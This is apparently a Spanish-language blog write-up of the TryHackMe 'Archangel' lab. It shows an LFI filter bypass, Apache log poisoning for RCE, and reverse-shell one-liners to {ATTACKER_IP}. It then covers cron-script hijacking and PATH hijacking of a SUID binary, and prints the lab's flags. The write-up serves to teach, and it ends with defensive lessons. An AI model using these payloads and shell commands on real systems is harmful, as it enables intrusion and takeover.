@@ -1,0 +1,338 @@
+---
+title: 'Archangel'
+description: 'LFI que se convierte en RCE mediante log poisoning, un cronjob para pivotar entre usuarios y PATH hijacking sobre un binario SUID para llegar a root.'
+publishDate: 2026-09-01
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - privesc
+---
+
+**Dificultad:** Easy **Categoría:** LFI, Log Poisoning (RCE), Cronjobs, PATH hijacking (SUID) **Sala:** [https://tryhackme.com/room/archangel](https://tryhackme.com/room/archangel)
+
+## Descripción de la sala
+
+Boot2root sobre una máquina Linux («WaveFire»/`mafialive.thm`) que combina explotación web (Local File Inclusion escalado a Remote Code Execution mediante envenenamiento de logs de Apache) con dos técnicas de escalada de privilegios encadenadas: secuestro de un cronjob y abuso de la variable `PATH` sobre un binario con bit SUID.
+
+> **Nota sobre placeholders:** se usa `{IP}` para la IP asignada por TryHackMe (cambia en cada despliegue) y `target`/`mafialive.thm` para el dominio, que sí es fijo en esta máquina pero requiere añadirlo manualmente a `/etc/hosts` apuntando a `{IP}`. También se usa `{ATTACKER_IP}` para representar la IP de la máquina atacante (necesaria para recibir shells reversas), y `{SSH_PUBLIC_KEY}` para la clave pública SSH.
+
+---
+
+## 1. Preparación del entorno
+
+```bash
+mkdir -p archangel/{scans,content,scripts,loot,exploits} && cd archangel
+settarget {IP}
+```
+
+Carpetas: `scans` para salidas de nmap, `content` para archivos/descargas, `scripts` para exploits propios, `loot` para credenciales/hallazgos, `exploits` para PoCs de terceros.
+
+---
+
+## 2. Reconocimiento (nmap)
+
+```bash
+nmap -p- --open -T5 -v -n {IP} -oG scans/initial-scan
+extractPorts scans/initial-scan
+```
+
+- `-p-`: escanea los 65535 puertos TCP.
+- `--open`: muestra solo los puertos abiertos.
+- `-T5`: temporización muy agresiva (útil en un CTF con poca latencia; en un pentest real conviene bajar el nivel para no saturar la red).
+- `-v`: verboso.
+- `-n`: no resuelve DNS (más rápido).
+- `-oG`: salida en formato «grepable», pensada para ser parseada por scripts.
+- `extractPorts`: script/alias personalizado (común en flujos de trabajo de OSCP-style) que parsea la salida `-oG` y extrae la lista de puertos abiertos, lista para pasarla a un segundo escaneo con `-sV -sC`.
+
+**Puertos esperados:**
+
+| Puerto | Servicio              |
+| ------ | --------------------- |
+| 22/tcp | SSH                   |
+| 80/tcp | HTTP (Apache, Ubuntu) |
+
+Con los puertos ya identificados, conviene lanzar un segundo escaneo de versión/scripts sobre ellos específicamente:
+
+```bash
+nmap -sV -sC -p22,80 {IP} -oN scans/detailed-scan
+```
+
+### 2.1 Descubrir el dominio virtual
+
+Al visitar `http://{IP}` en el navegador aparece una web estática de una empresa ficticia («WaveFire») con un correo de contacto tipo `contact@mafialive.thm` o `support@mafialive.thm` en el pie de página. Esto indica que el servidor usa **Virtual Hosting** basado en nombre, por lo que hay que resolver ese dominio manualmente:
+
+```bash
+echo "{IP}    mafialive.thm" | sudo tee -a /etc/hosts
+```
+
+A partir de aquí, todas las peticiones deben hacerse contra `http://mafialive.thm` y no contra la IP directamente, o el servidor podría no devolver el contenido correcto (comportamiento típico de vhosts).
+
+---
+
+## 3. Enumeración web
+
+```bash
+gobuster dir -u http://mafialive.thm -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://mafialive.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,bak -t 30
+```
+
+- `-x php,html,txt,bak`: prueba estas extensiones además de los nombres base (los `.bak` a veces revelan copias de seguridad de código fuente).
+- `-t 30`: 30 hilos concurrentes.
+
+Este fuzzing debería revelar un directorio de desarrollo, típicamente `development_testing/`, con un script `test.php` dentro.
+
+### 3.1 Analizando `test.php`
+
+```bash
+curl http://mafialive.thm/test.php -o content/test.php
+```
+
+Al descargar y examinar el archivo (o al probar parámetros comunes de LFI directamente en la URL), se descubre que `test.php` acepta un parámetro `view` que incluye archivos del sistema, es decir, un **Local File Inclusion (LFI)**:
+
+```
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/
+```
+
+El script filtra secuencias `../` para evitar el path traversal clásico, pero **no filtra rutas absolutas**, siempre que empiecen por la ruta esperada (`/var/www/html/development_testing/...`). Esto es una validación incompleta: basta con anteponer el prefijo esperado seguido de secuencias de escape para saltar fuera del directorio.
+
+---
+
+## 4. De LFI a RCE (Flag 2 — código fuente + Log Poisoning)
+
+### 4.1 Leer el código fuente con un wrapper PHP
+
+Como el LFI incluye el archivo PHP directamente (ejecutándolo), no podemos leer su código fuente en texto plano con una petición normal. Para ello usamos el wrapper `php://filter` con codificación Base64, lo que hace que PHP **no ejecute** el archivo sino que devuelva su contenido codificado:
+
+```bash
+curl "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php"
+```
+
+La respuesta es una cadena Base64. Se decodifica para leer el código fuente real de `test.php`:
+
+```bash
+echo '<CADENA_BASE64_OBTENIDA>' | base64 -d
+```
+
+> Dentro del código fuente decodificado se encuentra la **segunda flag** de la sala (una constante o comentario embebido en el propio script).
+
+Este paso también sirve para confirmar exactamente qué filtro de path aplica el script (por ejemplo, que exige que la ruta empiece por `/var/www/html/development_testing`), información clave para el siguiente paso.
+
+### 4.2 Confirmar acceso a los logs de Apache
+
+Con el LFI confirmado, el siguiente objetivo es leer un archivo cuyo contenido podamos controlar nosotros mismos: los **logs de acceso de Apache**, que registran (entre otras cosas) la cabecera `User-Agent` de cada petición recibida.
+
+```bash
+curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/../../../../../../var/log/apache2/access.log"
+```
+
+Aquí las secuencias `../` sí funcionan porque, tras el prefijo obligatorio `/var/www/html/development_testing`, el filtro ya no revisa el resto de la ruta; solo exige que **empiece** por esa cadena.
+
+Si el log se muestra en la respuesta (aunque sea con caracteres extraños por los User-Agents previos), el LFI puede escalarse a RCE.
+
+### 4.3 Envenenar el log (Log Poisoning) e inyectar PHP
+
+Enviamos una petición HTTP cualquiera al servidor, pero con un **payload PHP como valor del User-Agent**. Apache registrará ese User-Agent tal cual en el log:
+
+```bash
+curl http://mafialive.thm/ -A "<?php system(\$_GET['cmd']); ?>"
+```
+
+- `-A`: define la cabecera `User-Agent` de la petición.
+- Se usa `\$_GET` (con la barra invertida) para escapar el signo `$` y evitar que la propia shell de nuestro sistema lo interprete como una variable antes de enviarlo; dentro de las comillas dobles necesitamos ese escape para que la cadena literal `$_GET['cmd']` llegue intacta al servidor.
+- Se recomienda usar comillas simples para las cadenas PHP internas (`'cmd'`), ya que Apache suele _escapar_ las comillas dobles al escribir el log, lo que rompería un payload que dependiera de ellas.
+
+Ahora, cada vez que incluyamos el log a través del LFI, el intérprete de PHP del servidor **ejecutará** esa línea maliciosa como código:
+
+```bash
+curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/../../../../../../var/log/apache2/access.log&cmd=id"
+```
+
+Si la respuesta muestra la salida de `id` (por ejemplo `uid=33(www-data) gid=33(www-data)...`), tenemos **ejecución remota de comandos (RCE)** como el usuario `www-data`.
+
+> **Nota:** al hacer fuzzing en pasos anteriores (gobuster), el log habrá crecido mucho con líneas basura; si las cosas dejan de funcionar o las respuestas se vuelven inconsistentes, puede convenir reiniciar la máquina para limpiar el log antes de repetir el envenenamiento.
+
+### 4.4 Obtener una shell interactiva
+
+Con RCE confirmado vía `&cmd=`, se puede lanzar una reverse shell. Primero, en tu máquina atacante:
+
+```bash
+nc -lvnp 4444
+```
+
+Luego, mediante el parámetro `cmd` (URL-encodeado), se ejecuta un one-liner de reverse shell, por ejemplo:
+
+```bash
+curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/../../../../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{ATTACKER_IP}/4444+0>%261'"
+```
+
+Al recibir la conexión en el listener `nc`, obtenemos una shell interactiva como `www-data`. Es recomendable estabilizarla, por ejemplo con:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+## 5. Escalada horizontal: `www-data` → `archangel` (vía cronjob)
+
+### 5.1 Enumeración de tareas programadas
+
+```bash
+cat /etc/crontab
+```
+
+Se encuentra una entrada que ejecuta un script cada minuto **como el usuario `archangel`**:
+
+```
+*/1 * * * * archangel /opt/helloworld.sh
+```
+
+### 5.2 Permisos del script
+
+```bash
+ls -la /opt/helloworld.sh
+cat /opt/helloworld.sh
+```
+
+El script es propiedad de `archangel`, pero tiene **permisos 777 (rwxrwxrwx)** — es decir, cualquier usuario, incluido `www-data`, puede **escribir** en él. Su contenido original suele ser algo trivial como:
+
+```bash
+#!/bin/bash
+echo "hello world" >> /opt/backupfiles/helloworld.txt
+```
+
+### 5.3 Explotación: sobrescribir el cronjob
+
+Como `www-data` puede escribir el archivo, y el cron lo ejecutará en menos de 60 segundos **con los privilegios de `archangel`**, podemos reemplazar su contenido por comandos propios. Dos enfoques habituales:
+
+**Opción A — Añadir nuestra clave SSH pública** (persistente y limpio):
+
+```bash
+echo "mkdir -p /home/archangel/.ssh && echo '{SSH_PUBLIC_KEY}' > /home/archangel/.ssh/authorized_keys" > /opt/helloworld.sh
+```
+
+Tras esperar a que el cron se dispare (máximo 60 s), se puede acceder directamente por SSH sin contraseña:
+
+```bash
+ssh archangel@mafialive.thm
+```
+
+**Opción B — Reverse shell directa** (más rápido, menos persistente):
+
+```bash
+echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ATTACKER_IP} 4445 > /tmp/f' >> /opt/helloworld.sh
+```
+
+Con un listener (`nc -lvnp 4445`) esperando en la máquina atacante, se recibe una shell como `archangel` en cuanto se ejecuta el cron.
+
+> Cualquiera de las dos opciones es válida; la clave SSH es preferible porque sobrevive a la caída de la conexión y no depende de mantener el listener abierto.
+
+### 5.4 Flag de usuario (horizontal)
+
+Dentro del home de `archangel` (o en un subdirectorio `secret/`) se encuentra la flag correspondiente a esta fase:
+
+```bash
+cat /home/archangel/secret/user2.txt
+```
+
+<Flag value="thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}" />
+
+El propio nombre de la flag (`h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n`) confirma la técnica: escalada **horizontal** (cambio de un usuario sin privilegios especiales a otro usuario, no a root) aprovechando un **cronjob** mal configurado.
+
+---
+
+## 6. Escalada vertical: `archangel` → `root` (PATH hijacking sobre binario SUID)
+
+### 6.1 Hallazgo del binario SUID
+
+Dentro del mismo directorio (`~/secret`) hay un binario llamado `backup` con el bit **SUID** activo y propietario `root`:
+
+```bash
+ls -la ~/secret
+# -rwsr-xr-x 1 root root 16904 ... backup
+```
+
+La `s` en los permisos del propietario (`rws`) indica que el binario se ejecuta siempre con los privilegios de su dueño (**root**), sin importar qué usuario lo invoque.
+
+### 6.2 Análisis del binario
+
+```bash
+strings ~/secret/backup
+```
+
+El análisis de cadenas revela que el binario invoca internamente el comando `cp` **sin especificar su ruta absoluta** (es decir, llama a `cp` en lugar de `/bin/cp`). Esto es una vulnerabilidad clásica de **PATH hijacking**: cuando un programa ejecuta un comando por su nombre corto, el sistema lo busca recorriendo los directorios listados en la variable de entorno `$PATH`, en orden, y ejecuta el **primer binario que encuentre con ese nombre**.
+
+Si logramos anteponer un directorio bajo nuestro control al `$PATH`, y colocamos ahí un archivo ejecutable llamado `cp`, el sistema ejecutará _nuestro_ `cp` — y como el binario `backup` corre con SUID root, nuestro script también se ejecutará como **root**.
+
+### 6.3 Explotación
+
+Creamos un `cp` malicioso en el mismo directorio donde está `backup` (o cualquier directorio donde tengamos permisos de escritura y control total):
+
+```bash
+cd ~/secret
+echo -e '#!/bin/bash\n/bin/bash -p' > cp
+chmod +x cp
+```
+
+- `/bin/bash -p`: la opción `-p` (_privileged_) evita que bash abandone (drop) los privilegios efectivos de root al iniciar, algo que bash hace por defecto como medida de seguridad cuando detecta que el UID real y el UID efectivo difieren. Sin `-p`, obtendríamos una shell «normal» sin privilegios reales pese a haber sido lanzada por el binario SUID.
+
+Anteponemos el directorio actual al `PATH`, para que el sistema encuentre primero nuestro `cp` falso:
+
+```bash
+export PATH=/home/archangel/secret:$PATH
+```
+
+Ejecutamos el binario vulnerable:
+
+```bash
+./backup
+```
+
+El binario, al ejecutarse con privilegios de root, intenta invocar `cp` — encuentra nuestro script falso primero (por el `$PATH` modificado), lo ejecuta, y obtenemos una **shell de root**:
+
+```bash
+id
+# uid=1001(archangel) gid=1001(archangel) euid=0(root) ...
+```
+
+### 6.4 Flag de root (vertical)
+
+```bash
+cat /root/root.txt
+```
+
+<Flag value="thm{p4th_v4r1abl3_expl01tat1on_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}" />
+
+De nuevo, el nombre de la flag confirma la técnica: escalada **vertical** (de un usuario normal a root) explotando la **variable PATH**.
+
+---
+
+## 7. Resumen de la cadena de ataque
+
+1. **Reconocimiento** con `nmap` → puertos 22 (SSH) y 80 (HTTP).
+2. **Descubrimiento de virtual host** (`mafialive.thm`) desde el pie de página del sitio → se añade a `/etc/hosts`.
+3. **Fuzzing de directorios** → se descubre `development_testing/test.php`.
+4. **LFI** en el parámetro `view` de `test.php` (con filtro parcial que solo exige el prefijo de ruta).
+5. **Lectura de código fuente** vía `php://filter/convert.base64-encode` → segunda flag.
+6. **Log Poisoning**: se inyecta PHP en la cabecera `User-Agent`, y se incluye el `access.log` de Apache a través del LFI → **RCE** como `www-data`.
+7. **Escalada horizontal** `www-data → archangel`: cronjob que ejecuta `/opt/helloworld.sh` cada minuto, con permisos de escritura mundial → se sobrescribe con una clave SSH o reverse shell.
+8. **Escalada vertical** `archangel → root`: binario SUID `backup` que llama a `cp` sin ruta absoluta → **PATH hijacking** con un `cp` malicioso.
+9. **Root** y captura de ambas flags.
+
+## 8. Lecciones aprendidas / conceptos clave
+
+- **LFI con filtros incompletos**: bloquear `../` no es suficiente si no se valida también el uso de wrappers (`php://filter`) ni rutas absolutas con traversal después de un prefijo permitido.
+- **`php://filter/convert.base64-encode`**: técnica estándar para exfiltrar código fuente PHP a través de un LFI sin que el servidor lo ejecute.
+- **Log Poisoning**: cualquier campo de una petición HTTP que se refleje en un log accesible (User-Agent, Referer, URL) puede convertirse en vector de RCE si existe un LFI que permita incluir ese log.
+- **Cronjobs con permisos laxos**: cualquier tarea programada que corra como un usuario privilegiado, pero cuyo script sea escribible por un usuario menos privilegiado, es una escalada horizontal/vertical inmediata.
+- **PATH hijacking en binarios SUID**: nunca se deben invocar comandos del sistema por nombre corto dentro de binarios privilegiados; siempre debe usarse la ruta absoluta (`/bin/cp`) para evitar que un atacante controle qué binario se ejecuta realmente.
+- **`bash -p`**: recordatorio de que bash «deja caer» privilegios por defecto al detectar UID real ≠ UID efectivo, y de que hay que forzar `-p` para conservarlos en un contexto SUID.
+
+## 9. Herramientas utilizadas
+
+`nmap`, `gobuster`, `curl`, navegador (inspección manual), `strings`, `netcat`, cliente SSH, edición de `/etc/hosts`.
+
+---
+
+_Writeup con fines académicos, elaborada a partir de apuntes propios de la resolución de la máquina «Archangel» en TryHackMe, complementada con writeups públicas de la comunidad para completar los pasos de log poisoning, cronjob hijacking y PATH hijacking._
